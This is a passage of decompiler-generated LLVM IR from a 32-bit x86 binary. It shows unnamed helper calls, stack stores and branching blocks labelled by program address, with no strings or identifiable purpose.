  %v2_804eb99 = zext i1 %v1_804eb99 to i32
  %v2_804eb9c = icmp eq i1 %v1_804eb99, false
  store i32 %v2_804eb99, i32* %eax.global-to-local, align 4
  store i32 %v2_804eb99, i32* @esi, align 4
  br i1 %v2_804eb9c, label %dec_label_pc_804eea2, label %dec_label_pc_804ebab

dec_label_pc_804ebab:                             ; preds = %dec_label_pc_804eb7d, %dec_label_pc_804eb17
  %v0_804ebab = phi i32 [ %v1_804eb95, %dec_label_pc_804eb7d ], [ %v1_804eb6b, %dec_label_pc_804eb17 ]
  %v1_804ebae = add i32 %v0_804ebab, -16
  %v2_804ebae = inttoptr i32 %v1_804ebae to i32*
  store i32 26, i32* %v2_804ebae, align 4
  %v0_804ebb0 = call i32 @function_804f0d0()
  store i32 %v0_804ebb0, i32* %eax.global-to-local, align 4
  %v0_804ebb5 = load i32, i32* @esp, align 4
  %v1_804ebb5 = inttoptr i32 %v0_804ebb5 to i32*
  store i32 27, i32* %v1_804ebb5, align 4
  %v0_804ebbc = call i32 @function_804f0d0()
  store i32 %v0_804ebbc, i32* %eax.global-to-local, align 4
  %v0_804ebc4 = load i32, i32* @esi, align 4
  %v10_804ebc4 = icmp eq i32 %v0_804ebc4, -1
  br i1 %v10_804ebc4, label %dec_label_pc_804e415.backedge, label %dec_label_pc_804ebcd

dec_label_pc_804ebcd:                             ; preds = %dec_label_pc_804ebab, %dec_label_pc_804ec12
  %v0_804ebcd = phi i32 [ %v0_804ebc4, %dec_label_pc_804ebab ], [ %v0_804ebcd.pre, %dec_label_pc_804ec12 ]
  %v0_804ebd9.in = load i32, i32* @esp, align 4
  %tmp142 = icmp slt i32 %v0_804ebcd, 1
  br i1 %tmp142, label %dec_label_pc_804ea89, label %dec_label_pc_804ebd5

dec_label_pc_804ebd5:                             ; preds = %dec_label_pc_804ebcd
  %v0_804ebd5 = load i32, i32* @edi, align 4
  %v1_804ebd5 = inttoptr i32 %v0_804ebd5 to i32*
  %v2_804ebd5 = load i32, i32* %v1_804ebd5, align 4
  store i32 %v2_804ebd5, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804ebd9 = add i32 %v0_804ebd9.in, 12
  %v2_804ebd9 = inttoptr i32 %v1_804ebd9 to i32*
  store i32 16384, i32* %v2_804ebd9, align 4
  %v0_804ebde = load i32, i32* %edx.global-to-local, align 4
  %v1_804ebde = add i32 %v0_804ebde, 12
  %v2_804ebde = inttoptr i32 %v1_804ebde to i8*
  %v3_804ebde = load i8, i8* %v2_804ebde, align 1
  %v4_804ebde = zext i8 %v3_804ebde to i32
  %v5_804ebde = load i32, i32* %eax.global-to-local, align 4
  %v6_804ebde = and i32 %v5_804ebde, -256
  %v7_804ebde = or i32 %v6_804ebde, %v4_804ebde
  store i32 %v7_804ebde, i32* %eax.global-to-local, align 4
  %v2_804ebe1 = add i32 %v0_804ebd9.in, 8
  %v3_804ebe1 = inttoptr i32 %v2_804ebe1 to i32*
  store i32 %v7_804ebde, i32* %v3_804ebe1, align 4
  %v0_804ebe2 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ebe2 = inttoptr i32 %v0_804ebe2 to i32*
  %v2_804ebe2 = load i32, i32* %v1_804ebe2, align 4
  %v2_804ebe4 = add i32 %v0_804ebd9.in, 4
  %v3_804ebe4 = inttoptr i32 %v2_804ebe4 to i32*
  store i32 %v2_804ebe2, i32* %v3_804ebe4, align 4
  %v0_804ebe5 = load i32, i32* @edi, align 4
  %v1_804ebe5 = add i32 %v0_804ebe5, 4
  %v2_804ebe5 = inttoptr i32 %v1_804ebe5 to i32*
  %v3_804ebe5 = load i32, i32* %v2_804ebe5, align 4
  store i32 %v3_804ebe5, i32* @ebx, align 4
  %v3_804ebe8 = inttoptr i32 %v0_804ebd9.in to i32*
  store i32 %v3_804ebe5, i32* %v3_804ebe8, align 4
  %v0_804ebe9 = call i32 @function_80501e6()
  store i32 %v0_804ebe9, i32* %eax.global-to-local, align 4
  %v0_804ebee = load i32, i32* @esp, align 4
  %v1_804ebee = add i32 %v0_804ebee, -4
  %v2_804ebee = inttoptr i32 %v1_804ebee to i32*
  store i32 16384, i32* %v2_804ebee, align 4
  %v1_804ebf3 = add i32 %v0_804ebee, -8
  %v2_804ebf3 = inttoptr i32 %v1_804ebf3 to i32*
  store i32 2, i32* %v2_804ebf3, align 4
  %v1_804ebf5 = add i32 %v0_804ebee, -12
  %v2_804ebf5 = inttoptr i32 %v1_804ebf5 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80523f9.22 to i32), i32* %v2_804ebf5, align 4
  %v0_804ebfa = load i32, i32* @edi, align 4
  %v1_804ebfa = add i32 %v0_804ebfa, 4
  %v2_804ebfa = inttoptr i32 %v1_804ebfa to i32*
  %v3_804ebfa = load i32, i32* %v2_804ebfa, align 4
  store i32 %v3_804ebfa, i32* %ecx.global-to-local, align 4
  %v2_804ebfd = add i32 %v0_804ebee, -16
  %v3_804ebfd = inttoptr i32 %v2_804ebfd to i32*
  store i32 %v3_804ebfa, i32* %v3_804ebfd, align 4
  %v0_804ebfe = call i32 @function_80501e6()
  store i32 %v0_804ebfe, i32* %eax.global-to-local, align 4
  %v0_804ec06 = load i32, i32* @edi, align 4
  %v1_804ec06 = add i32 %v0_804ec06, 12
  %v2_804ec06 = inttoptr i32 %v1_804ec06 to i32*
  store i32 4, i32* %v2_804ec06, align 4
  br label %dec_label_pc_804e778

dec_label_pc_804ec12:                             ; preds = %dec_label_pc_804eb0b
  %v0_804ec12 = load i32, i32* @esp, align 4
  %v1_804ec15 = add i32 %v0_804ec12, -16
  %v2_804ec15 = inttoptr i32 %v1_804ec15 to i32*
  store i32 26, i32* %v2_804ec15, align 4
  %v0_804ec17 = call i32 @function_804f0d0()
  store i32 %v0_804ec17, i32* %eax.global-to-local, align 4
  %v0_804ec1c = load i32, i32* @esp, align 4
  %v1_804ec1c = inttoptr i32 %v0_804ec1c to i32*
  store i32 27, i32* %v1_804ec1c, align 4
  %v0_804ec23 = call i32 @function_804f0d0()
  store i32 %v0_804ec23, i32* %eax.global-to-local, align 4
  %v0_804ebcd.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ebcd

dec_label_pc_804ec2d:                             ; preds = %dec_label_pc_804e6f7
  store i32 9, i32* %v1_804ec37, align 4
  %v0_804ec3e = call i32 @function_804f150()
  store i32 %v0_804ec3e, i32* %eax.global-to-local, align 4
  %v0_804ec43 = load i32, i32* @esp, align 4
  %v1_804ec43 = inttoptr i32 %v0_804ec43 to i32*
  %v3_804ec43 = add i32 %v0_804ec43, 4
  %v1_804ec44 = inttoptr i32 %v3_804ec43 to i32*
  %v1_804ec45 = add i32 %v0_804ec43, 1864
  store i32 %v1_804ec45, i32* %eax.global-to-local, align 4
  store i32 %v1_804ec45, i32* %v1_804ec44, align 4
  store i32 9, i32* %v1_804ec43, align 4
  %v0_804ec4f = call i32 @function_804f0a0()
  store i32 %v0_804ec4f, i32* %eax.global-to-local, align 4
  %v0_804ec54 = load i32, i32* @esp, align 4
  %v1_804ec54 = add i32 %v0_804ec54, 1864
  %v2_804ec54 = inttoptr i32 %v1_804ec54 to i32*
  %v3_804ec54 = load i32, i32* %v2_804ec54, align 4
  %v1_804ec5b = add i32 %v3_804ec54, -1
  store i32 %v1_804ec5b, i32* %edx.global-to-local, align 4
  %v2_804ec5c = add i32 %v0_804ec54, -4
  %v3_804ec5c = inttoptr i32 %v2_804ec5c to i32*
  store i32 %v1_804ec5b, i32* %v3_804ec5c, align 4
  %v2_804ec5d = add i32 %v0_804ec54, -8
  %v3_804ec5d = inttoptr i32 %v2_804ec5d to i32*
  store i32 %v0_804ec4f, i32* %v3_804ec5d, align 4
  %v0_804ec5e = load i32, i32* @edi, align 4
  %v1_804ec5e = add i32 %v0_804ec5e, 24
  %v2_804ec5e = inttoptr i32 %v1_804ec5e to i32*
  %v3_804ec5e = load i32, i32* %v2_804ec5e, align 4
  %v2_804ec61 = add i32 %v0_804ec54, -12
  %v3_804ec61 = inttoptr i32 %v2_804ec61 to i32*
  store i32 %v3_804ec5e, i32* %v3_804ec61, align 4
  %v1_804ec62 = add i32 %v0_804ec54, 24
  %v2_804ec62 = inttoptr i32 %v1_804ec62 to i32*
  %v3_804ec62 = load i32, i32* %v2_804ec62, align 4
  store i32 %v3_804ec62, i32* @ebx, align 4
  %v2_804ec66 = add i32 %v0_804ec54, -16
  %v3_804ec66 = inttoptr i32 %v2_804ec66 to i32*
  store i32 %v3_804ec62, i32* %v3_804ec66, align 4
  %v0_804ec67 = call i32 @function_804f640()
  store i32 %v0_804ec67, i32* %eax.global-to-local, align 4
  %v0_804ec6c = load i32, i32* @esp, align 4
  store i32 %v0_804ec67, i32* @esi, align 4
  %v1_804ec71 = add i32 %v0_804ec6c, 16
  %v2_804ec71 = inttoptr i32 %v1_804ec71 to i32*
  store i32 9, i32* %v2_804ec71, align 4
  %v0_804ec73 = call i32 @function_804f0d0()
  store i32 %v0_804ec73, i32* %eax.global-to-local, align 4
  %v0_804ec78 = load i32, i32* @esp, align 4
  %v0_804ec7b = load i32, i32* @esi, align 4
  %v10_804ec7b = icmp eq i32 %v0_804ec7b, -1
  br i1 %v10_804ec7b, label %dec_label_pc_804e415.backedge, label %dec_label_pc_804ec84

dec_label_pc_804ec84:                             ; preds = %dec_label_pc_804ec2d
  %tmp143 = icmp slt i32 %v0_804ec7b, 1
  br i1 %tmp143, label %dec_label_pc_804ea89, label %dec_label_pc_804ec8c

dec_label_pc_804ec8c:                             ; preds = %dec_label_pc_804ec84
  %v0_804ec8c = load i32, i32* @edi, align 4
  %v1_804ec8c = add i32 %v0_804ec8c, 20
  %v2_804ec8c = inttoptr i32 %v1_804ec8c to i32*
  %v3_804ec8c = load i32, i32* %v2_804ec8c, align 4
  store i32 %v3_804ec8c, i32* %edx.global-to-local, align 4
  %v1_804ec8f = add i32 %v0_804ec8c, 16
  %v2_804ec8f = inttoptr i32 %v1_804ec8f to i32*
  %v3_804ec8f = load i32, i32* %v2_804ec8f, align 4
  store i32 %v3_804ec8f, i32* %eax.global-to-local, align 4
  %v1_804ec92 = inttoptr i32 %v0_804ec8c to i32*
  %v2_804ec92 = load i32, i32* %v1_804ec92, align 4
  store i32 %v2_804ec92, i32* @ebp, align 4
  %v2_804ec94 = add i32 %v0_804ec78, 1872
  %v3_804ec94 = inttoptr i32 %v2_804ec94 to i32*
  store i32 %v3_804ec8f, i32* %v3_804ec94, align 4
  %v0_804ec9b = load i32, i32* %edx.global-to-local, align 4
  %v1_804ec9b = trunc i32 %v0_804ec9b to i16
  %v2_804ec9b = load i32, i32* @esp, align 4
  %v3_804ec9b = add i32 %v2_804ec9b, 1866
  %v4_804ec9b = inttoptr i32 %v3_804ec9b to i16*
  store i16 %v1_804ec9b, i16* %v4_804ec9b, align 2
  %v0_804eca3 = call i32 @function_804fae1()
  store i32 %v0_804eca3, i32* %eax.global-to-local, align 4
  %tmp144 = icmp slt i32 %v0_804eca3, 1
  br i1 %tmp144, label %dec_label_pc_804eec0, label %dec_label_pc_804ecb0

dec_label_pc_804ecb0:                             ; preds = %dec_label_pc_804eec0, %dec_label_pc_804ec8c
  %v0_804ecb0 = load i32, i32* @esp, align 4
  %v0_804ecb3 = load i32, i32* @edi, align 4
  %v1_804ecb3 = add i32 %v0_804ecb3, 4
  %v2_804ecb3 = inttoptr i32 %v1_804ecb3 to i32*
  %v3_804ecb3 = load i32, i32* %v2_804ecb3, align 4
  %v2_804ecb6 = add i32 %v0_804ecb0, -16
  %v3_804ecb6 = inttoptr i32 %v2_804ecb6 to i32*
  store i32 %v3_804ecb3, i32* %v3_804ecb6, align 4
  %v1_804ecb7 = call i32 @function_804fab3(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804ecb7, i32* %eax.global-to-local, align 4
  %v0_804ecbf = load i32, i32* @edi, align 4
  %v1_804ecbf = add i32 %v0_804ecbf, 4
  %v2_804ecbf = inttoptr i32 %v1_804ecbf to i32*
  store i32 -1, i32* %v2_804ecbf, align 4
  %v0_804ecc6 = load i32, i32* @edi, align 4
  %v1_804ecc6 = add i32 %v0_804ecc6, 12
  %v2_804ecc6 = inttoptr i32 %v1_804ecc6 to i32*
  store i32 0, i32* %v2_804ecc6, align 4
  br label %dec_label_pc_804e778

dec_label_pc_804ecd2:                             ; preds = %dec_label_pc_804e9dc
  %v0_804ecd2 = load i32, i32* @esp, align 4
  %v1_804ecd5 = add i32 %v0_804ecd2, -16
  %v2_804ecd5 = inttoptr i32 %v1_804ecd5 to i32*
  store i32 25, i32* %v2_804ecd5, align 4
  %v0_804ecd7 = call i32 @function_804f0d0()
  store i32 %v0_804ecd7, i32* %eax.global-to-local, align 4
  %v0_804ea47.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ea47

dec_label_pc_804ece4:                             ; preds = %dec_label_pc_804e5bc, %dec_label_pc_804e5bc, %dec_label_pc_804e5bc, %dec_label_pc_804e5bc, %dec_label_pc_804e5bc
  %v1_804ece4 = add i32 %v0_804ece4, 1
  store i32 %v1_804ece4, i32* @esi, align 4
  %v10_804ece7 = icmp eq i32 %v0_804ece4, -2
  br i1 %v10_804ece7, label %dec_label_pc_804e415.backedge, label %dec_label_pc_804ecf0

dec_label_pc_804ecf0:                             ; preds = %dec_label_pc_804ece4
  %tmp145 = icmp slt i32 %v1_804ece4, 1
  br i1 %tmp145, label %dec_label_pc_804ea89, label %dec_label_pc_804ecf8

dec_label_pc_804ecf8:                             ; preds = %dec_label_pc_804ecf0
  %v0_804ecf8 = load i32, i32* @esp, align 4
  %v1_804ecfb = add i32 %v0_804ecf8, -16
  %v2_804ecfb = inttoptr i32 %v1_804ecfb to i32*
  store i32 5, i32* %v2_804ecfb, align 4
  %v0_804ecfd = call i32 @function_804f150()
  store i32 %v0_804ecfd, i32* %eax.global-to-local, align 4
  %v0_804ed02 = load i32, i32* @esp, align 4
  %v1_804ed02 = inttoptr i32 %v0_804ed02 to i32*
  %v2_804ed02 = load i32, i32* %v1_804ed02, align 4
  store i32 %v2_804ed02, i32* %eax.global-to-local, align 4
  %v3_804ed02 = add i32 %v0_804ed02, 4
  %v1_804ed03 = inttoptr i32 %v3_804ed02 to i32*
  %v2_804ed03 = load i32, i32* %v1_804ed03, align 4
  store i32 %v2_804ed03, i32* %edx.global-to-local, align 4
  %v1_804ed04 = add i32 %v0_804ed02, 1864
  store i32 %v1_804ed04, i32* %ecx.global-to-local, align 4
  store i32 %v1_804ed04, i32* %v1_804ed03, align 4
  store i32 5, i32* %v1_804ed02, align 4
  %v0_804ed0e = call i32 @function_804f0a0()
  store i32 %v0_804ed0e, i32* %eax.global-to-local, align 4
  %v0_804ed13 = load i32, i32* @esp, align 4
  %v1_804ed13 = add i32 %v0_804ed13, -4
  %v2_804ed13 = inttoptr i32 %v1_804ed13 to i32*
  store i32 16384, i32* %v2_804ed13, align 4
  %v1_804ed18 = add i32 %v0_804ed13, 1864
  %v2_804ed18 = inttoptr i32 %v1_804ed18 to i32*
  %v3_804ed18 = load i32, i32* %v2_804ed18, align 4
  %v2_804ed1f = add i32 %v0_804ed13, -8
  %v3_804ed1f = inttoptr i32 %v2_804ed1f to i32*
  store i32 %v3_804ed18, i32* %v3_804ed1f, align 4
  %v2_804ed20 = add i32 %v0_804ed13, -12
  %v3_804ed20 = inttoptr i32 %v2_804ed20 to i32*
  store i32 %v0_804ed0e, i32* %v3_804ed20, align 4
  %v0_804ed21 = load i32, i32* @edi, align 4
  %v1_804ed21 = add i32 %v0_804ed21, 4
  %v2_804ed21 = inttoptr i32 %v1_804ed21 to i32*
  %v3_804ed21 = load i32, i32* %v2_804ed21, align 4
  store i32 %v3_804ed21, i32* @ebx, align 4
  %v2_804ed24 = add i32 %v0_804ed13, -16
  %v3_804ed24 = inttoptr i32 %v2_804ed24 to i32*
  store i32 %v3_804ed21, i32* %v3_804ed24, align 4
  %v0_804ed25 = call i32 @function_80501e6()
  store i32 %v0_804ed25, i32* %eax.global-to-local, align 4
  %v0_804ed2a = load i32, i32* @esp, align 4
  %v1_804ed2d = add i32 %v0_804ed2a, 28
  %v2_804ed2d = inttoptr i32 %v1_804ed2d to i32*
  store i32 16384, i32* %v2_804ed2d, align 4
  %v1_804ed32 = add i32 %v0_804ed2a, 24
  %v2_804ed32 = inttoptr i32 %v1_804ed32 to i32*
  store i32 2, i32* %v2_804ed32, align 4
  %v1_804ed34 = add i32 %v0_804ed2a, 20
  %v2_804ed34 = inttoptr i32 %v1_804ed34 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80523f9.22 to i32), i32* %v2_804ed34, align 4
  %v0_804ed39 = load i32, i32* @edi, align 4
  %v1_804ed39 = add i32 %v0_804ed39, 4
  %v2_804ed39 = inttoptr i32 %v1_804ed39 to i32*
  %v3_804ed39 = load i32, i32* %v2_804ed39, align 4
  store i32 %v3_804ed39, i32* %ecx.global-to-local, align 4
  %v2_804ed3c = add i32 %v0_804ed2a, 16
  %v3_804ed3c = inttoptr i32 %v2_804ed3c to i32*
  store i32 %v3_804ed39, i32* %v3_804ed3c, align 4
  %v0_804ed3d = call i32 @function_80501e6()
  store i32 %v0_804ed3d, i32* %eax.global-to-local, align 4
  %v0_804ed42 = load i32, i32* @esp, align 4
  %v1_804ed42 = inttoptr i32 %v0_804ed42 to i32*
  store i32 5, i32* %v1_804ed42, align 4
  %v0_804ed49 = call i32 @function_804f0d0()
  store i32 %v0_804ed49, i32* %eax.global-to-local, align 4
  %v0_804ed51 = load i32, i32* @edi, align 4
  %v1_804ed51 = add i32 %v0_804ed51, 12
  %v2_804ed51 = inttoptr i32 %v1_804ed51 to i32*
  store i32 6, i32* %v2_804ed51, align 4
  br label %dec_label_pc_804e778

dec_label_pc_804ed5d:                             ; preds = %dec_label_pc_804e7af, %dec_label_pc_804e7af, %dec_label_pc_804e7af, %dec_label_pc_804e7af, %dec_label_pc_804e7af
  %v1_804ed5d = add i32 %v0_804ed5d, 1
  store i32 %v1_804ed5d, i32* @esi, align 4
  %v10_804ed60 = icmp eq i32 %v0_804ed5d, -2
  br i1 %v10_804ed60, label %dec_label_pc_804e415.backedge, label %dec_label_pc_804ed69

dec_label_pc_804ed69:                             ; preds = %dec_label_pc_804ed5d
  %tmp146 = icmp slt i32 %v1_804ed5d, 1
  br i1 %tmp146, label %dec_label_pc_804ea89, label %dec_label_pc_804ed71

dec_label_pc_804ed71:                             ; preds = %dec_label_pc_804ed69
  %v0_804ed71 = load i32, i32* @esp, align 4
  %v1_804ed74 = add i32 %v0_804ed71, -16
  %v2_804ed74 = inttoptr i32 %v1_804ed74 to i32*
  store i32 4, i32* %v2_804ed74, align 4
  %v0_804ed76 = call i32 @function_804f150()
  store i32 %v0_804ed76, i32* %eax.global-to-local, align 4
  %v0_804ed7b = load i32, i32* @esp, align 4
  %v1_804ed7b = inttoptr i32 %v0_804ed7b to i32*
  %v2_804ed7b = load i32, i32* %v1_804ed7b, align 4
  store i32 %v2_804ed7b, i32* %eax.global-to-local, align 4
  %v3_804ed7b = add i32 %v0_804ed7b, 4
  %v1_804ed7c = inttoptr i32 %v3_804ed7b to i32*
  %v2_804ed7c = load i32, i32* %v1_804ed7c, align 4
  store i32 %v2_804ed7c, i32* %edx.global-to-local, align 4
  %v1_804ed7d = add i32 %v0_804ed7b, 1872
  store i32 %v1_804ed7d, i32* %eax.global-to-local, align 4
  store i32 %v1_804ed7d, i32* %v1_804ed7c, align 4
  store i32 4, i32* %v1_804ed7b, align 4
  %v0_804ed87 = call i32 @function_804f0a0()
  store i32 %v0_804ed87, i32* %eax.global-to-local, align 4
  %v0_804ed8c = load i32, i32* @esp, align 4
  %v1_804ed8c = add i32 %v0_804ed8c, -4
  %v2_804ed8c = inttoptr i32 %v1_804ed8c to i32*
  store i32 16384, i32* %v2_804ed8c, align 4
  %v1_804ed91 = add i32 %v0_804ed8c, 1872
  %v2_804ed91 = inttoptr i32 %v1_804ed91 to i32*
  %v3_804ed91 = load i32, i32* %v2_804ed91, align 4
  %v2_804ed98 = add i32 %v0_804ed8c, -8
  %v3_804ed98 = inttoptr i32 %v2_804ed98 to i32*
  store i32 %v3_804ed91, i32* %v3_804ed98, align 4
  %v2_804ed99 = add i32 %v0_804ed8c, -12
  %v3_804ed99 = inttoptr i32 %v2_804ed99 to i32*
  store i32 %v0_804ed87, i32* %v3_804ed99, align 4
  %v0_804ed9a = load i32, i32* @edi, align 4
  %v1_804ed9a = add i32 %v0_804ed9a, 4
  %v2_804ed9a = inttoptr i32 %v1_804ed9a to i32*
  %v3_804ed9a = load i32, i32* %v2_804ed9a, align 4
  store i32 %v3_804ed9a, i32* @ebx, align 4
  %v2_804ed9d = add i32 %v0_804ed8c, -16
  %v3_804ed9d = inttoptr i32 %v2_804ed9d to i32*
  store i32 %v3_804ed9a, i32* %v3_804ed9d, align 4
  %v0_804ed9e = call i32 @function_80501e6()
  store i32 %v0_804ed9e, i32* %eax.global-to-local, align 4
  %v0_804eda3 = load i32, i32* @esp, align 4
  %v1_804eda6 = add i32 %v0_804eda3, 28
  %v2_804eda6 = inttoptr i32 %v1_804eda6 to i32*
  store i32 16384, i32* %v2_804eda6, align 4
  %v1_804edab = add i32 %v0_804eda3, 24
  %v2_804edab = inttoptr i32 %v1_804edab to i32*
  store i32 2, i32* %v2_804edab, align 4
  %v1_804edad = add i32 %v0_804eda3, 20
  %v2_804edad = inttoptr i32 %v1_804edad to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80523f9.22 to i32), i32* %v2_804edad, align 4
  %v0_804edb2 = load i32, i32* @edi, align 4
  %v1_804edb2 = add i32 %v0_804edb2, 4
  %v2_804edb2 = inttoptr i32 %v1_804edb2 to i32*
  %v3_804edb2 = load i32, i32* %v2_804edb2, align 4
  store i32 %v3_804edb2, i32* %ecx.global-to-local, align 4
  %v2_804edb5 = add i32 %v0_804eda3, 16
  %v3_804edb5 = inttoptr i32 %v2_804edb5 to i32*
  store i32 %v3_804edb2, i32* %v3_804edb5, align 4
  %v0_804edb6 = call i32 @function_80501e6()
  store i32 %v0_804edb6, i32* %eax.global-to-local, align 4
  %v0_804edbb = load i32, i32* @esp, align 4
  %v1_804edbb = inttoptr i32 %v0_804edbb to i32*
  store i32 4, i32* %v1_804edbb, align 4
  %v0_804edc2 = call i32 @function_804f0d0()
  store i32 %v0_804edc2, i32* %eax.global-to-local, align 4
  %v0_804edca = load i32, i32* @edi, align 4
  %v1_804edca = add i32 %v0_804edca, 12
  %v2_804edca = inttoptr i32 %v1_804edca to i32*
  store i32 8, i32* %v2_804edca, align 4
  br label %dec_label_pc_804e778

dec_label_pc_804edd6:                             ; preds = %dec_label_pc_804e3e1
  %v1_804edd6 = add i32 %v0_804e3eb, 1856
  %v2_804edd6 = inttoptr i32 %v1_804edd6 to i32*
  store i32 0, i32* %v2_804edd6, align 4
  %v0_804ede1 = load i32, i32* @esp, align 4
  %v1_804ede1 = add i32 %v0_804ede1, 1848
  %v2_804ede1 = inttoptr i32 %v1_804ede1 to i32*
  store i32 4, i32* %v2_804ede1, align 4
  %v0_804edec = load i32, i32* @esp, align 4
  %v1_804edef = add i32 %v0_804edec, 1848
  %v2_804edf6 = add i32 %v0_804edec, -16
  %v3_804edf6 = inttoptr i32 %v2_804edf6 to i32*
  store i32 %v1_804edef, i32* %v3_804edf6, align 4
  %v1_804edf7 = add i32 %v0_804edec, 1856
  store i32 %v1_804edf7, i32* %eax.global-to-local, align 4
  %v2_804edfe = add i32 %v0_804edec, -20
  %v3_804edfe = inttoptr i32 %v2_804edfe to i32*
  store i32 %v1_804edf7, i32* %v3_804edfe, align 4
  %v1_804edff = add i32 %v0_804edec, -24
  %v2_804edff = inttoptr i32 %v1_804edff to i32*
  store i32 4, i32* %v2_804edff, align 4
  %v1_804ee01 = add i32 %v0_804edec, -28
  %v2_804ee01 = inttoptr i32 %v1_804ee01 to i32*
  store i32 1, i32* %v2_804ee01, align 4
  %v0_804ee03 = load i32, i32* @edi, align 4
  %v1_804ee03 = add i32 %v0_804ee03, 4
  %v2_804ee03 = inttoptr i32 %v1_804ee03 to i32*
  %v3_804ee03 = load i32, i32* %v2_804ee03, align 4
  store i32 %v3_804ee03, i32* %eax.global-to-local, align 4
  %v2_804ee06 = add i32 %v0_804edec, -32
  %v3_804ee06 = inttoptr i32 %v2_804ee06 to i32*
  store i32 %v3_804ee03, i32* %v3_804ee06, align 4
  %v0_804ee07 = call i32 @function_8050112()
  store i32 %v0_804ee07, i32* %eax.global-to-local, align 4
  %v0_804ee0c = load i32, i32* @esp, align 4
  %v2_804ee0f = add i32 %v0_804ee0c, 1888
  %v3_804ee0f = inttoptr i32 %v2_804ee0f to i32*
  %v4_804ee0f = load i32, i32* %v3_804ee0f, align 4
  %v5_804ee0f = or i32 %v4_804ee0f, %v0_804ee07
  %v6_804ee0f = icmp eq i32 %v5_804ee0f, 0
  store i32 %v5_804ee0f, i32* %eax.global-to-local, align 4
  %v1_804ee16 = icmp eq i1 %v6_804ee0f, false
  br i1 %v1_804ee16, label %dec_label_pc_804ee79, label %dec_label_pc_804ee18

dec_label_pc_804ee18:                             ; preds = %dec_label_pc_804edd6
  %v0_804ee18 = load i32, i32* @edi, align 4
  %v1_804ee18 = add i32 %v0_804ee18, 12
  %v2_804ee18 = inttoptr i32 %v1_804ee18 to i32*
  store i32 2, i32* %v2_804ee18, align 4
  %v0_804ee1f = call i32 @function_804d6b0()
  %v1_804ee1f = sext i32 %v0_804ee1f to i64
  %v0_804ee24 = load i16, i16* @global_var_805312c.23, align 4
  %v1_804ee24 = zext i16 %v0_804ee24 to i32
  %v0_804ee31 = load i32, i32* @global_var_80530e0.24, align 32
  store i32 %v0_804ee31, i32* @ebx, align 4
  store i32 %v1_804ee24, i32* %ecx.global-to-local, align 4
  %v8_804ee3b = zext i16 %v0_804ee24 to i64
  %v9_804ee3b = udiv i64 %v1_804ee1f, %v8_804ee3b
  %v10_804ee3b = trunc i64 %v9_804ee3b to i32
  store i32 %v10_804ee3b, i32* %eax.global-to-local, align 4
  %v11_804ee3b = urem i64 %v1_804ee1f, %v8_804ee3b
  %v12_804ee3b = trunc i64 %v11_804ee3b to i32
  store i32 %v12_804ee3b, i32* %edx.global-to-local, align 4
  %tmp147 = icmp slt i32 %v0_804ee31, 1
  br i1 %tmp147, label %dec_label_pc_804ee66, label %dec_label_pc_804ee41

dec_label_pc_804ee41:                             ; preds = %dec_label_pc_804ee18
  %v0_804ee41 = load i32, i32* @global_var_8053128.25, align 8
  store i32 %v0_804ee41, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_804ee58 = trunc i64 %v11_804ee3b to i16
  br label %dec_label_pc_804ee58

dec_label_pc_804ee50:                             ; preds = %dec_label_pc_804ee5e, %dec_label_pc_804ee58
  %v1_804ee50 = add i32 %v0_804ee50, 1
  store i32 %v1_804ee50, i32* %ecx.global-to-local, align 4
  %v1_804ee51 = add i32 %v0_804ee51, 16
  store i32 %v1_804ee51, i32* %eax.global-to-local, align 4
  %v12_804ee54 = icmp eq i32 %v1_804ee50, %v0_804ee31
  br i1 %v12_804ee54, label %dec_label_pc_804ee66, label %dec_label_pc_804ee58

dec_label_pc_804ee58:                             ; preds = %dec_label_pc_804ee50, %dec_label_pc_804ee41
  %v0_804ee50 = phi i32 [ %v1_804ee50, %dec_label_pc_804ee50 ], [ 0, %dec_label_pc_804ee41 ]
  %v0_804ee51 = phi i32 [ %v1_804ee51, %dec_label_pc_804ee50 ], [ %v0_804ee41, %dec_label_pc_804ee41 ]
  %v3_804ee58 = add i32 %v0_804ee51, 8
  %v4_804ee58 = inttoptr i32 %v3_804ee58 to i16*
  %v5_804ee58 = load i16, i16* %v4_804ee58, align 2
  %v11_804ee58 = icmp ult i16 %v1_804ee58, %v5_804ee58
  br i1 %v11_804ee58, label %dec_label_pc_804ee50, label %dec_label_pc_804ee5e

dec_label_pc_804ee5e:                             ; preds = %dec_label_pc_804ee58
  %v3_804ee5e = add i32 %v0_804ee51, 10
  %v4_804ee5e = inttoptr i32 %v3_804ee5e to i16*
  %v5_804ee5e = load i16, i16* %v4_804ee5e, align 2
  %v11_804ee5e = icmp ult i16 %v1_804ee58, %v5_804ee5e
  %v1_804ee62 = icmp eq i1 %v11_804ee5e, false
  br i1 %v1_804ee62, label %dec_label_pc_804ee50, label %dec_label_pc_804ee68

dec_label_pc_804ee66:                             ; preds = %dec_label_pc_804ee50, %dec_label_pc_804ee18
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ee68

dec_label_pc_804ee68:                             ; preds = %dec_label_pc_804ee5e, %dec_label_pc_804ee66
  %v0_804ee6b = phi i32 [ 0, %dec_label_pc_804ee66 ], [ %v0_804ee51, %dec_label_pc_804ee5e ]
  %v0_804ee68 = load i32, i32* @edi, align 4
  %v1_804ee68 = add i32 %v0_804ee68, 4
  %v2_804ee68 = inttoptr i32 %v1_804ee68 to i32*
  %v3_804ee68 = load i32, i32* %v2_804ee68, align 4
  store i32 %v3_804ee68, i32* %ecx.global-to-local, align 4
  %v2_804ee6b = inttoptr i32 %v0_804ee68 to i32*
  store i32 %v0_804ee6b, i32* %v2_804ee6b, align 4
  %v0_804ee6d = load i32, i32* @edi, align 4
  %v1_804ee6d = add i32 %v0_804ee6d, 24
  %v2_804ee6d = inttoptr i32 %v1_804ee6d to i32*
  store i32 0, i32* %v2_804ee6d, align 4
  %v0_804e3fe.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804e406.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e3fe

dec_label_pc_804ee79:                             ; preds = %dec_label_pc_804edd6
  %v0_804ee7c = load i32, i32* @edi, align 4
